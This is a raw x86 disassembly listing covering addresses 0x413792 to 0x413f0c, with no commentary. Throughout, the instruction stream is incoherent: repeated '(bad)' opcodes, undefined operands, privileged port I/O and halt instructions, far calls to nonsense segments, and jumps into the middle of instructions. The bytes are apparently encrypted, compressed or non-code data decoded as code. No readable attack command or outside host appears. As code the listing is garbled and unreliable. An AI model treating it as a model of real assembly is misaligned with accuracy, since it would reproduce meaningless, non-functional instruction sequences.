  413792:	pmulhuw mm7,QWORD PTR [esp+esi*8]
  413796:	inc    esp
  413797:	lods   eax,DWORD PTR ds:[esi]
  413798:	shr    BYTE PTR [edx+0x54],1
  41379b:	gs jo  0x413774
  41379e:	idiv   DWORD PTR [ebp+0x41]
  4137a1:	test   BYTE PTR [ebp+0x57],ah
  4137a4:	stos   BYTE PTR es:[edi],al
  4137a5:	sub    eax,0x2dc65c4
  4137aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137ab:	xchg   ebx,eax
  4137ac:	lods   eax,DWORD PTR ds:[esi]
  4137ad:	cld    
  4137ae:	adc    ch,cl
  4137b0:	sub    DWORD PTR [esi-0x661b816c],edi
  4137b6:	mov    al,0x61
  4137b8:	popa   
  4137b9:	idiv   DWORD PTR [ecx-0x4]
  4137bc:	mov    ds:0xb917e84,al
  4137c1:	test   eax,0xfcf18252
  4137c6:	pop    ss
  4137c7:	dec    ebp
  4137c8:	xchg   edi,eax
  4137c9:	add    cl,BYTE PTR [edx]
  4137cb:	cmp    ebx,edi
  4137cd:	jbe    0x413813
  4137cf:	mov    ecx,0x2313a4d1
  4137d4:	mov    edi,0x5bd5b110
  4137d9:	adc    edx,eax
  4137db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137dc:	mov    BYTE PTR ss:[ebp-0x61],al
  4137e0:	(bad)  
  4137e1:	push   eax
  4137e2:	popf   
  4137e3:	out    dx,eax
  4137e4:	push   eax
  4137e5:	push   edx
  4137e6:	in     al,0xdb
  4137e8:	push   ss
  4137e9:	shr    BYTE PTR [edx-0x481e0e36],0x26
  4137f0:	push   0x51
  4137f2:	inc    edx
  4137f3:	imul   bx,WORD PTR [edi],0x62b9
  4137f8:	mul    ch
  4137fa:	(bad)  
  4137fb:	(bad)  
  4137fc:	xchg   esi,eax
  4137fd:	sahf   
  4137fe:	in     al,0x9b
  413800:	sti    
  413801:	inc    ebx
  413802:	xchg   ebx,eax
  413803:	enter  0x1fc6,0x82
  413807:	push   ss
  413808:	(bad)  
  413809:	data16 adc ah,ch
  41380c:	in     eax,dx
  41380d:	sbb    al,0xab
  41380f:	sbb    dh,ah
  413811:	mov    bl,0x74
  413813:	or     eax,0x6f8fca9d
  413818:	cmc    
  413819:	adc    ebp,DWORD PTR [eax-0x71]
  41381c:	dec    edi
  41381d:	repz imul esi,DWORD PTR [edx+0x263994de],0xb297e8f5
  413828:	retf   
  413829:	xchg   ebx,eax
  41382a:	fisubr DWORD PTR [edx]
  41382c:	ja     0x413812
  41382e:	leave  
  41382f:	pop    eax
  413830:	or     eax,0x807d4332
  413835:	push   ss
  413836:	jge    0x413808
  413838:	les    esp,FWORD PTR [ebp+edx*1+0x32]
  41383c:	shr    BYTE PTR [edx+ebp*1-0x67c58a0b],0xc9
  413844:	sub    BYTE PTR [esi-0x5b],0xd3
  413848:	cmp    BYTE PTR [ecx+0x72],dl
  41384b:	push   ebp
  41384c:	js     0x41387e
  41384e:	mov    WORD PTR [edx],cs
  413850:	aad    0xe3
  413852:	mov    bh,0xbd
  413854:	ss pop ecx
  413856:	jp     0x413868
  413858:	xor    ah,dl
  41385a:	fwait
  41385b:	imul   ebp,edx,0xffffffcd
  41385e:	pop    ebx
  41385f:	cmp    cl,BYTE PTR [eax+eiz*8]
  413862:	scas   al,BYTE PTR es:[edi]
  413863:	jo     0x4137fc
  413865:	adc    esp,DWORD PTR [edx]
  413867:	enter  0x1ec5,0x49
  41386b:	mov    ds:0xd2712c53,al
  413870:	call   0xc706:0x3041076
  413877:	inc    esi
  413878:	ret    0xd9d9
  41387b:	mov    edx,0x279c4505
  413880:	jmp    0x609ae2bd
  413885:	push   esp
  413887:	mov    dh,0x72
  413889:	xchg   ecx,eax
  41388a:	aam    0x5c
  41388c:	pushf  
  41388d:	push   edx
  41388e:	dec    esp
  41388f:	int3   
  413890:	repz cmp al,0xba
  413893:	mov    eax,0xf863147d
  413898:	std    
  413899:	inc    esi
  41389a:	lock aam 0x89
  41389d:	sub    BYTE PTR [edx+0x6a],ah
  4138a0:	aaa    
  4138a1:	test   al,0xee
  4138a3:	test   DWORD PTR [ebp+0x1e537956],edi
  4138a9:	jns    0x4138de
  4138ab:	jae    0x413887
  4138ad:	scas   al,BYTE PTR es:[edi]
  4138ae:	(bad)  
  4138af:	mov    esp,0x87d7bef3
  4138b4:	fnstcw WORD PTR [esi]
  4138b6:	and    bl,dl
  4138b8:	push   cs
  4138b9:	sti    
  4138ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138bb:	int    0x96
  4138bd:	aaa    
  4138be:	cli    
  4138bf:	mov    ecx,0x8f65c9a4
  4138c4:	add    DWORD PTR [edx],edx
  4138c6:	(bad)  
  4138c7:	loope  0x41386c
  4138c9:	repnz mov eax,ds:0x15781d1a
  4138cf:	loopne 0x41392d
  4138d1:	jp     0x413876
  4138d3:	ins    BYTE PTR es:[edi],dx
  4138d4:	pusha  
  4138d5:	cmp    al,BYTE PTR [eax+0x7f7d3727]
  4138db:	mov    WORD PTR [edx+eax*1+0x3509559c],?
  4138e2:	pop    ebx
  4138e3:	in     al,dx
  4138e4:	push   0xffffff90
  4138e6:	cdq    
  4138e7:	dec    ebx
  4138e8:	sbb    eax,0x1f6a905
  4138ed:	adc    dh,BYTE PTR [edi-0x15]
  4138f0:	push   cs
  4138f1:	xchg   esi,eax
  4138f2:	mov    bh,0xd2
  4138f4:	pop    ebx
  4138f5:	mov    cl,bh
  4138f7:	mov    ecx,0x245acdc0
  4138fc:	mov    ebp,0x18c284dc
  413901:	mov    dl,0x84
  413903:	hlt    
  413904:	(bad)  
  413905:	loop   0x4138bd
  413907:	sbb    BYTE PTR ds:0xdec7febe,al
  41390d:	in     al,0x63
  41390f:	push   cs
  413910:	dec    DWORD PTR [edi+0x2be1591b]
  413916:	push   esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,DWORD PTR ds:[esi]
  413919:	push   ebp
  41391a:	popf   
  41391b:	icebp  
  41391c:	das    
  41391d:	push   ebx
  41391e:	dec    ecx
  41391f:	push   ebx
  413920:	lds    ecx,FWORD PTR [ecx]
  413922:	hlt    
  413923:	out    dx,eax
  413924:	cmp    dh,BYTE PTR [ecx*8-0x46687d47]
  41392b:	adc    eax,0x5b39b4cf
  413930:	bound  ecx,QWORD PTR [ecx+eiz*4+0x6bec7fbd]
  413937:	pop    es
  413938:	pop    esi
  413939:	icebp  
  41393a:	jp     0x413925
  41393c:	not    BYTE PTR [eax+0x5d]
  41393f:	push   ds
  413940:	aaa    
  413941:	sub    al,0xe0
  413943:	mov    BYTE PTR [ebx],bl
  413945:	push   eax
  413946:	add    ah,BYTE PTR [ecx+0x1beac601]
  41394c:	pop    ebx
  41394d:	or     eax,0x570fed7e
  413952:	mov    cl,0x26
  413954:	enter  0xef17,0x7b
  413958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413959:	shr    DWORD PTR [ebp+0x4d],0x91
  41395d:	mov    ah,0xd9
  41395f:	dec    edx
  413960:	repz or dl,BYTE PTR [edi+0x33a209a8]
  413967:	cld    
  413968:	add    DWORD PTR [eax],edi
  41396a:	mov    edx,esi
  41396c:	aaa    
  41396d:	daa    
  41396e:	stos   BYTE PTR es:[edi],al
  41396f:	pop    edx
  413970:	jl     0x41390a
  413972:	mov    al,ds:0xc09090fa
  413977:	lods   eax,DWORD PTR ds:[esi]
  413978:	xchg   edi,eax
  413979:	je     0x413918
  41397b:	jge    0x413973
  41397d:	pop    ebx
  41397e:	(bad)  [edi+0x18]
  413981:	push   ds
  413982:	cli    
  413983:	and    edx,DWORD PTR [ebx+eax*4]
  413986:	je     0x4139b9
  413988:	cmp    dl,BYTE PTR [edi-0x43]
  41398b:	dec    esi
  41398c:	mov    ebp,0xf11827e2
  413991:	shl    DWORD PTR ds:0x1d63c0d2,0x12
  413998:	aaa    
  413999:	sbb    ecx,DWORD PTR [esi-0xe]
  41399c:	xchg   ebx,eax
  41399d:	clc    
  41399e:	(bad)  
  41399f:	xlat   BYTE PTR ds:[ebx]
  4139a0:	cmp    bl,BYTE PTR [edx]
  4139a2:	sub    al,BYTE PTR [esi+0x6d3c792b]
  4139a8:	inc    ecx
  4139a9:	xchg   esi,eax
  4139aa:	fmul   DWORD PTR [eax-0x5e]
  4139ad:	jg     0x41397c
  4139af:	in     eax,dx
  4139b0:	stc    
  4139b1:	and    eax,0x91d7636e
  4139b6:	mov    eax,DWORD PTR [ebx]
  4139b8:	add    ch,BYTE PTR [ecx+0x6a]
  4139bb:	cmp    DWORD PTR [eax-0x76],ecx
  4139be:	ins    BYTE PTR es:[edi],dx
  4139bf:	push   ss
  4139c0:	shr    BYTE PTR [ebp+0x76],1
  4139c3:	sbb    al,0x39
  4139c5:	(bad)  [esi-0x28f19f1]
  4139cb:	and    BYTE PTR [edi+0x32],0x14
  4139cf:	enter  0xeb70,0x55
  4139d3:	jbe    0x4139b4
  4139d5:	sar    ebp,0xc6
  4139d8:	cmp    ecx,0xe49cbf26
  4139de:	cmp    al,0xae
  4139e0:	call   0x43a45f74
  4139e5:	(bad)  
  4139e6:	mov    dh,0xcd
  4139e8:	imul   ecx,DWORD PTR [edi-0xc],0xffffffae
  4139ec:	js     0x413999
  4139ee:	scas   al,BYTE PTR es:[edi]
  4139ef:	bnd jl 0x413a3d
  4139f2:	jns    0x413a1e
  4139f4:	push   ebp
  4139f5:	leave  
  4139f6:	cs aas 
  4139f8:	add    eax,0x2a7b7698
  4139fd:	xchg   ebx,eax
  4139fe:	fnstcw WORD PTR [ebx+0x7d]
  413a01:	fwait
  413a02:	ss (bad) 
  413a04:	mov    bl,BYTE PTR [esi+0x33ca51dc]
  413a0a:	(bad)  
  413a0b:	and    BYTE PTR [ebp-0x32],al
  413a0e:	inc    edi
  413a0f:	mov    ebx,0xdfb6bc49
  413a14:	std    
  413a15:	xchg   ecx,eax
  413a16:	mov    dl,0x5f
  413a18:	in     al,dx
  413a19:	aas    
  413a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1b:	out    0xe0,al
  413a1d:	adc    ecx,DWORD PTR ss:[ebx]
  413a20:	loopne 0x413a6b
  413a22:	push   edi
  413a23:	push   ecx
  413a24:	mov    ecx,0xdb85508c
  413a29:	xchg   edx,eax
  413a2a:	sub    BYTE PTR [ebx+0x6683052f],bh
  413a30:	and    eax,0xafcfb2f8
  413a35:	mov    al,0xfd
  413a37:	shr    DWORD PTR [esi],1
  413a39:	pop    esp
  413a3a:	lods   al,BYTE PTR ds:[esi]
  413a3b:	dec    eax
  413a3c:	std    
  413a3d:	inc    eax
  413a3e:	add    ah,BYTE PTR ds:0x38e3c010
  413a44:	and    BYTE PTR [edx+eiz*2-0x52],0xfe
  413a49:	inc    esp
  413a4a:	rol    ebx,cl
  413a4c:	rcr    DWORD PTR [ebp-0x62],cl
  413a4f:	xchg   esi,eax
  413a50:	into   
  413a51:	mov    WORD PTR [ebp-0x71],es
  413a54:	sbb    DWORD PTR [esi],0xbc907e66
  413a5a:	test   eax,0xadac3b0a
  413a5f:	sub    BYTE PTR [ebp+0x152ce6dc],0x61
  413a66:	cmp    edi,DWORD PTR [ecx]
  413a68:	sbb    cl,BYTE PTR [eax-0x75]
  413a6b:	sbb    esp,DWORD PTR [edi-0x4415e392]
  413a71:	daa    
  413a72:	jmp    0x413a2d
  413a74:	xchg   bh,bl
  413a76:	pop    esi
  413a77:	pop    edi
  413a78:	data16 (bad) 
  413a7a:	xchg   edi,eax
  413a7b:	inc    edi
  413a7c:	pushf  
  413a7d:	and    ch,ch
  413a7f:	dec    ebx
  413a80:	or     eax,0xa6ba3448
  413a85:	les    ecx,FWORD PTR [ecx-0x72]
  413a88:	es push ebx
  413a8a:	mov    edx,0x8e1c5ac0
  413a8f:	shl    BYTE PTR [ebx],cl
  413a91:	mov    al,0xb6
  413a93:	xchg   ebx,eax
  413a94:	xchg   edi,eax
  413a95:	out    0x1c,al
  413a97:	sub    ecx,DWORD PTR [edi-0x39]
  413a9a:	pop    ebp
  413a9b:	mov    bh,0xd9
  413a9d:	pop    esp
  413a9e:	popf   
  413a9f:	sbb    al,0xb7
  413aa1:	push   ecx
  413aa2:	sub    ah,BYTE PTR [ecx+0x79]
  413aa5:	pop    esp
  413aa6:	inc    ebx
  413aa7:	jns    0x413ad6
  413aa9:	sbb    al,0xa8
  413aab:	lods   al,BYTE PTR ds:[esi]
  413aac:	xchg   ebp,eax
  413aad:	dec    edi
  413aae:	popf   
  413aaf:	add    ebp,esi
  413ab1:	and    bl,bl
  413ab3:	push   esp
  413ab4:	add    al,0x7a
  413ab6:	ja     0x413b0c
  413ab8:	xor    bl,ah
  413aba:	(bad)  
  413abb:	call   0xb6f9:0xea3e30f8
  413ac2:	sub    edi,ebx
  413ac4:	xchg   ecx,eax
  413ac5:	inc    esp
  413ac6:	cmp    al,0xa1
  413ac8:	mov    ebx,0xc87433a8
  413acd:	je     0x413a8a
  413acf:	inc    edi
  413ad0:	xor    ecx,edx
  413ad2:	cmc    
  413ad3:	lods   al,BYTE PTR ds:[esi]
  413ad4:	rcr    edi,cl
  413ad6:	(bad)  
  413ad7:	popa   
  413ad8:	or     al,0xbe
  413ada:	inc    ecx
  413adb:	shl    DWORD PTR [ebp-0xaa8238e],cl
  413ae1:	xor    esi,edx
  413ae3:	or     ah,ch
  413ae5:	ucomiss xmm6,DWORD PTR [ecx]
  413ae8:	xchg   ebp,eax
  413ae9:	fcomp  DWORD PTR [esi+esi*4+0x1b]
  413aed:	jns    0x413af6
  413aef:	popf   
  413af0:	jecxz  0x413b4c
  413af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413af3:	fsub   DWORD PTR [ebx-0x1fcc8901]
  413af9:	shl    BYTE PTR [ecx+0x1656f9b4],1
  413aff:	mov    cl,0x79
  413b01:	dec    eax
  413b02:	and    dh,BYTE PTR [ecx-0x75f6fc8a]
  413b08:	mov    ebp,0x97becaa5
  413b0d:	mov    ah,0x94
  413b0f:	jno    0x413b0c
  413b11:	loop   0x413ac7
  413b13:	adc    dh,bl
  413b15:	push   ds
  413b16:	mov    bh,0x47
  413b18:	xor    al,0xa
  413b1a:	jg     0x413b12
  413b1c:	inc    ecx
  413b1d:	push   cs
  413b1e:	jb     0x413ae5
  413b20:	xor    eax,0x8fb107b8
  413b25:	sub    edx,DWORD PTR [ebp-0x6ba78f4]
  413b2b:	pop    edx
  413b2c:	fdecstp 
  413b2e:	jmp    0x413b3f
  413b30:	cli    
  413b31:	jle    0x413b86
  413b33:	mov    ds:0xa474ee4b,eax
  413b38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b39:	ins    BYTE PTR es:[edi],dx
  413b3a:	jl     0x413b1f
  413b3c:	ret    0x74a4
  413b3f:	stos   BYTE PTR es:[edi],al
  413b40:	imul   edx,DWORD PTR [edx],0x9705a2a7
  413b46:	(bad)  
  413b47:	sub    al,0x76
  413b49:	push   esp
  413b4a:	icebp  
  413b4b:	or     bl,bl
  413b4d:	scas   al,BYTE PTR es:[edi]
  413b4e:	lods   al,BYTE PTR ds:[esi]
  413b4f:	jnp    0x413b43
  413b51:	in     al,0x9a
  413b53:	jbe    0x413b7e
  413b55:	outs   dx,DWORD PTR ds:[esi]
  413b56:	and    DWORD PTR [esi-0x5f],0xd1068daa
  413b5d:	ret    0xc94d
  413b60:	sub    ecx,0x1a
  413b63:	xor    al,0xa8
  413b65:	aaa    
  413b66:	xchg   DWORD PTR [esi+eax*8],edx
  413b69:	(bad)
  413b6c:	icebp  
  413b6d:	ror    DWORD PTR [edx],0x62
  413b70:	ror    DWORD PTR ds:0x3f306306,cl
  413b76:	imul   ebx,DWORD PTR [esp+edi*8],0x66
  413b7a:	ss call 0xb60b:0xb1ab18d9
  413b82:	shl    DWORD PTR [ecx-0x41eacf44],cl
  413b88:	jb     0x413b99
  413b8a:	push   0x5e451504
  413b8f:	pop    eax
  413b90:	loope  0x413b3b
  413b92:	mov    ecx,0x8887057c
  413b97:	xchg   DWORD PTR [ebx-0x6f8a3537],ebx
  413b9d:	sub    eax,0x661aa542
  413ba2:	push   cs
  413ba3:	sub    DWORD PTR [edi],esi
  413ba5:	sbb    dl,dh
  413ba7:	mov    ?,ebp
  413ba9:	aam    0xf5
  413bab:	out    0x1b,al
  413bad:	or     DWORD PTR [esp+eiz*4],esi
  413bb0:	dec    edi
  413bb1:	xor    BYTE PTR [ebx+ebp*2],ch
  413bb4:	sar    BYTE PTR [ebp+ecx*4-0x4a],cl
  413bb8:	pop    es
  413bb9:	cld    
  413bba:	dec    ecx
  413bbb:	aam    0x3b
  413bbd:	or     al,0x36
  413bbf:	sti    
  413bc0:	test   DWORD PTR [ebx+edx*1+0x18],ecx
  413bc4:	mov    BYTE PTR [ebp+0xa1b27d5],dh
  413bca:	mov    dl,0xf5
  413bcc:	mov    ah,0x0
  413bce:	int3   
  413bcf:	loope  0x413b57
  413bd1:	ret    0xb336
  413bd4:	mov    DWORD PTR cs:[edx+0x67],ebx
  413bd8:	xchg   ebp,eax
  413bd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bda:	cmp    eax,DWORD PTR [esi+0x64]
  413bdd:	jae    0x413bb3
  413bdf:	cmp    BYTE PTR [edx-0x58],bl
  413be2:	idiv   BYTE PTR [ecx]
  413be4:	sbb    esp,DWORD PTR [ebp-0x79a79012]
  413bea:	fmul   st,st(1)
  413bec:	mov    cl,ch
  413bee:	cmp    eax,0x44bc8909
  413bf3:	inc    ecx
  413bf4:	outs   dx,DWORD PTR ds:[esi]
  413bf5:	xor    al,0x4a
  413bf7:	test   DWORD PTR [esi+0x147d717e],0xf76e48d5
  413c01:	ins    DWORD PTR es:[edi],dx
  413c02:	cmp    BYTE PTR [ebp+edi*1-0x7f],cl
  413c06:	mov    bh,0xc1
  413c08:	push   ss
  413c09:	xlat   BYTE PTR ds:[ebx]
  413c0a:	std    
  413c0b:	std    
  413c0c:	test   eax,0xc5af1d81
  413c11:	clc    
  413c12:	nop
  413c13:	xchg   esp,eax
  413c14:	sbb    eax,0x59e79e4c
  413c19:	sbb    al,0x31
  413c1b:	pop    es
  413c1c:	mov    ch,0x8f
  413c1e:	xchg   DWORD PTR [eax-0x17],ecx
  413c21:	inc    ecx
  413c22:	daa    
  413c23:	sbb    ecx,esi
  413c25:	iret   
  413c26:	lds    ebx,FWORD PTR [ebp-0x29]
  413c29:	adc    al,0xa8
  413c2b:	xchg   edx,eax
  413c2c:	push   edx
  413c2d:	int    0xd8
  413c2f:	daa    
  413c30:	sub    ch,ch
  413c32:	loop   0x413c6f
  413c34:	outs   dx,BYTE PTR ds:[esi]
  413c35:	xor    BYTE PTR [esi+0x19],dh
  413c38:	or     DWORD PTR [ecx],eax
  413c3a:	cmp    BYTE PTR [eax+0x54694c55],al
  413c40:	push   ecx
  413c41:	in     eax,0x0
  413c43:	imul   eax,DWORD PTR [ebp+0x3c],0xffffffa3
  413c47:	push   ebx
  413c48:	pop    ebx
  413c49:	out    0x86,al
  413c4b:	les    edx,FWORD PTR [edx-0x348ff45e]
  413c51:	bound  esi,QWORD PTR [esi-0x4b60e907]
  413c57:	adc    ecx,DWORD PTR [ecx+0x3e53837f]
  413c5d:	mov    ebp,0x5b23acb4
  413c62:	cs xchg edx,eax
  413c64:	cmp    eax,0xdd29e311
  413c69:	fstp   DWORD PTR [eax-0x9e95870]
  413c6f:	push   es
  413c70:	stos   WORD PTR es:[edi],ax
  413c72:	nop
  413c73:	xchg   ebp,eax
  413c74:	sub    al,BYTE PTR gs:[eax]
  413c77:	cmp    al,0x72
  413c79:	cmc    
  413c7a:	outs   dx,BYTE PTR ds:[esi]
  413c7b:	icebp  
  413c7c:	test   DWORD PTR [esi+0x45],0xc393d6ff
  413c83:	dec    edx
  413c84:	dec    ebx
  413c85:	repz sub bh,BYTE PTR [esi+0x5247201a]
  413c8c:	mov    al,BYTE PTR [esi-0xc]
  413c8f:	int3   
  413c90:	or     bh,BYTE PTR [ebx]
  413c92:	jbe    0x413c99
  413c94:	fs pop ebx
  413c96:	retf   
  413c97:	arpl   WORD PTR ds:0xbe61d02,sp
  413c9d:	test   dh,dl
  413c9f:	lea    esp,[edx+0x2]
  413ca2:	jo     0x413c49
  413ca4:	bound  esp,QWORD PTR [ebp+ebx*1-0xa]
  413ca8:	inc    edi
  413ca9:	fadd   DWORD PTR [ecx*4-0x2a808ad8]
  413cb0:	dec    esp
  413cb1:	xor    edi,DWORD PTR [ecx+0x7a86c597]
  413cb7:	std    
  413cb8:	sahf   
  413cb9:	sar    BYTE PTR [ebx-0x30799579],0x8e
  413cc0:	retf   0xdce8
  413cc3:	scas   eax,DWORD PTR es:[edi]
  413cc4:	repnz inc DWORD PTR [esp+eiz*4]
  413cc8:	nop
  413cc9:	bound  esp,QWORD PTR [ebx-0x6a]
  413ccc:	dec    edi
  413ccd:	fs ds push es
  413cd0:	or     ebp,DWORD PTR [edi+0x6cea5591]
  413cd6:	das    
  413cd7:	pop    edi
  413cd8:	add    BYTE PTR [esi],dl
  413cda:	cmp    dl,dl
  413cdc:	or     al,0x37
  413cde:	daa    
  413cdf:	or     BYTE PTR [esi+eiz*4+0x62],bh
  413ce3:	xchg   ecx,eax
  413ce4:	test   DWORD PTR ds:[eax-0x233f5197],ecx
  413ceb:	arpl   WORD PTR [eax-0x5a],ax
  413cee:	jno    0x413d5f
  413cf0:	int3   
  413cf1:	lods   al,BYTE PTR ds:[esi]
  413cf2:	pushf  
  413cf3:	sbb    DWORD PTR [esi-0x617a8935],ecx
  413cf9:	cld    
  413cfa:	mov    ch,0x4f
  413cfc:	jge    0x413d0b
  413cfe:	addr16 dec esi
  413d00:	mov    dh,0xf1
  413d02:	leave  
  413d03:	jge    0x413d14
  413d05:	mov    ebx,edx
  413d07:	sub    dh,cl
  413d09:	or     eax,0x5144a1d2
  413d0e:	sub    eax,edx
  413d10:	push   ecx
  413d11:	push   esp
  413d12:	stos   BYTE PTR es:[edi],al
  413d13:	jge    0x413d12
  413d15:	push   ss
  413d16:	jnp    0x413d38
  413d18:	je     0x413d95
  413d1a:	mov    dh,0x68
  413d1c:	ficomp DWORD PTR [edx-0x34]
  413d1f:	or     eax,0x7444c4c1
  413d24:	cwde   
  413d25:	fdivr  DWORD PTR [ecx-0x3b]
  413d28:	and    DWORD PTR [edi-0x25cf8c55],esi
  413d2e:	pop    ecx
  413d2f:	jbe    0x413d6e
  413d31:	pop    eax
  413d32:	inc    esp
  413d33:	cmp    ebx,DWORD PTR [esi+0x18dad723]
  413d39:	cld    
  413d3a:	dec    ebx
  413d3b:	lods   eax,DWORD PTR ds:[esi]
  413d3c:	xor    esi,DWORD PTR [edi-0x66]
  413d3f:	out    0x10,al
  413d41:	out    0xdd,eax
  413d43:	push   edx
  413d44:	lods   eax,DWORD PTR ds:[esi]
  413d45:	je     0x413d6c
  413d47:	push   esp
  413d48:	jns    0x413cd0
  413d4a:	adc    ebx,DWORD PTR [edi-0x7d91b1de]
  413d50:	inc    edx
  413d51:	dec    esp
  413d52:	neg    DWORD PTR [ebp+0x3f]
  413d55:	push   cs
  413d56:	pop    ebx
  413d57:	sti    
  413d58:	pop    ebx
  413d59:	shl    DWORD PTR [esi-0x5a5d8cd9],cl
  413d5f:	iret   
  413d60:	into   
  413d61:	leave  
  413d62:	cwde   
  413d63:	sub    al,0x9d
  413d65:	mov    esp,0x28e608b3
  413d6a:	push   cs
  413d6b:	mov    dh,0x14
  413d6d:	inc    edi
  413d6e:	mov    al,0xae
  413d70:	aam    0xf2
  413d72:	dec    esi
  413d73:	and    BYTE PTR [esi+esi*4],bl
  413d76:	(bad)  
  413d77:	fs mov dl,0xf1
  413d7a:	inc    esp
  413d7b:	test   eax,0x9c92a35f
  413d80:	es xor al,0x1c
  413d83:	cli    
  413d84:	xchg   edx,eax
  413d85:	test   bh,al
  413d87:	idiv   eax
  413d89:	mov    ah,0x6b
  413d8b:	mov    ah,0x3a
  413d8d:	test   ebp,ecx
  413d8f:	xchg   esi,eax
  413d90:	retw   0x33bd
  413d94:	xor    BYTE PTR [ebx+0x21],dl
  413d97:	xlat   BYTE PTR ds:[ebx]
  413d98:	xchg   esp,eax
  413d99:	les    edx,FWORD PTR [esi+0x404f7336]
  413d9f:	lds    di,DWORD PTR [ecx+0x11]
  413da3:	les    edi,FWORD PTR [eax-0x2c99b562]
  413da9:	pop    eax
  413daa:	mov    ch,0x3a
  413dac:	sbb    ebx,DWORD PTR [edi-0x70]
  413daf:	(bad)
  413db3:	xlat   BYTE PTR ds:[ebx]
  413db4:	int3   
  413db5:	lahf   
  413db6:	adc    eax,0xb4d9fb7f
  413dbb:	retf   
  413dbc:	fnstcw WORD PTR [edx-0x53]
  413dbf:	ror    esp,0x96
  413dc2:	xor    eax,0x606911cb
  413dc7:	mov    cs,WORD PTR [edi]
  413dc9:	xchg   ecx,eax
  413dca:	js     0x413d78
  413dcc:	stc    
  413dcd:	cmp    al,0x8a
  413dcf:	fistp  DWORD PTR [eax+edx*8-0x69f4ed7b]
  413dd6:	daa    
  413dd7:	mov    dh,0x30
  413dd9:	icebp  
  413dda:	xchg   BYTE PTR [esi+0x40f37d69],bh
  413de0:	mov    ds:0x99925d5c,al
  413de5:	(bad)
  413de9:	xor    al,0xcf
  413deb:	add    BYTE PTR [eax-0x10035e8c],bh
  413df1:	fcmovb st,st(6)
  413df3:	(bad)  
  413df4:	lds    esi,FWORD PTR [ebp+0xec0f54d]
  413dfa:	shl    BYTE PTR [ebx+0x46],0x4f
  413dfe:	cmp    eax,0xa2944e95
  413e03:	ja     0x413d99
  413e05:	inc    esp
  413e06:	jb     0x413e4f
  413e08:	pop    DWORD PTR [eax]
  413e0a:	sbb    ch,BYTE PTR [edi+0x6047d2d]
  413e10:	inc    eax
  413e11:	aas    
  413e12:	push   eax
  413e13:	rcr    bl,1
  413e15:	mov    eax,ds:0xe4096cfe
  413e1a:	(bad)  [ebp+0x430db543]
  413e20:	rcl    BYTE PTR [esi+0x677cf6f],1
  413e26:	push   esp
  413e27:	sbb    eax,0xf3a994eb
  413e2c:	sub    ecx,DWORD PTR [ebx+eiz*2]
  413e2f:	int    0x15
  413e31:	neg    BYTE PTR [edx-0x7c]
  413e34:	adc    bh,ch
  413e36:	imul   eax,DWORD PTR [edx-0x64],0x75961c13
  413e3d:	inc    esi
  413e3e:	pop    es
  413e3f:	repz xchg esp,eax
  413e41:	retf   
  413e42:	sahf   
  413e43:	and    BYTE PTR [edx],al
  413e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e46:	clc    
  413e47:	pop    es
  413e48:	dec    esp
  413e49:	aaa    
  413e4a:	xor    bh,0x5c
  413e4d:	cmp    eax,0x505e8ea0
  413e52:	in     eax,0x95
  413e54:	or     eax,0x25eec81b
  413e59:	out    0xe,al
  413e5b:	mov    ?,WORD PTR [edi-0x5c949ba0]
  413e61:	jo     0x413e9e
  413e63:	add    BYTE PTR [ecx],dh
  413e65:	mov    edi,0x95cca243
  413e6a:	aaa    
  413e6b:	xchg   BYTE PTR [eax+0x2991e6cc],ah
  413e71:	adc    bh,dl
  413e73:	fistp  QWORD PTR [edi+eiz*2]
  413e76:	push   eax
  413e77:	or     al,0xc5
  413e79:	stos   DWORD PTR es:[edi],eax
  413e7a:	test   bl,0xf0
  413e7d:	pop    eax
  413e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e7f:	jo     0x413e55
  413e81:	(bad)  
  413e82:	pop    ebx
  413e83:	mov    DWORD PTR [edx+0x50],edx
  413e86:	sub    bl,BYTE PTR [esi]
  413e88:	popa   
  413e89:	dec    ebx
  413e8a:	cmp    al,0xea
  413e8c:	cmp    eax,0xf5fc0354
  413e91:	aas    
  413e92:	adc    BYTE PTR [edi+0x4f83ac8e],bl
  413e98:	sbb    bh,bl
  413e9a:	jbe    0x413edf
  413e9c:	dec    eax
  413e9d:	and    esp,0x4d
  413ea0:	sub    DWORD PTR [esi+0xe],edi
  413ea3:	call   0x8bf2c191
  413ea8:	dec    edi
  413ea9:	mov    BYTE PTR [ebp+0x656f22cc],ch
  413eaf:	in     al,dx
  413eb0:	xchg   ecx,eax
  413eb1:	ret    0x1291
  413eb4:	jp     0x413e4b
  413eb6:	xor    bl,dh
  413eb8:	and    ah,BYTE PTR ds:0x18768285
  413ebe:	retf   
  413ebf:	pop    ss
  413ec0:	sub    DWORD PTR [ecx],0x186928d
  413ec6:	push   esp
  413ec7:	inc    ebx
  413ec8:	dec    ecx
  413ec9:	cmp    bl,ah
  413ecb:	in     eax,0xf3
  413ecd:	cdq    
  413ece:	cld    
  413ecf:	inc    esi
  413ed0:	push   ebx
  413ed1:	jns    0x413e72
  413ed3:	and    ebx,DWORD PTR [edi]
  413ed5:	jb     0x413f1a
  413ed7:	push   0xa988c075
  413edc:	fist   DWORD PTR [eax+0x2a]
  413edf:	into   
  413ee0:	out    0x12,al
  413ee2:	mov    ch,0x1a
  413ee4:	jo     0x413f50
  413ee6:	mov    cl,0x1a
  413ee8:	cmp    BYTE PTR [esi-0x11e04316],bl
  413eee:	out    dx,eax
  413eef:	into   
  413ef0:	ins    BYTE PTR es:[edi],dx
  413ef1:	mov    dh,0x73
  413ef3:	out    0x1c,eax
  413ef5:	mov    bl,0x28
  413ef7:	jl     0x413f5d
  413ef9:	cwde   
  413efa:	(bad)  
  413efc:	popf   
  413efd:	push   0xffffffb5
  413eff:	stos   BYTE PTR es:[edi],al
  413f00:	xchg   ebp,eax
  413f01:	ret    0x38c7
  413f04:	sub    esp,DWORD PTR [esi+0x73e5f730]
  413f0a:	gs popa 
  413f0c:	into   
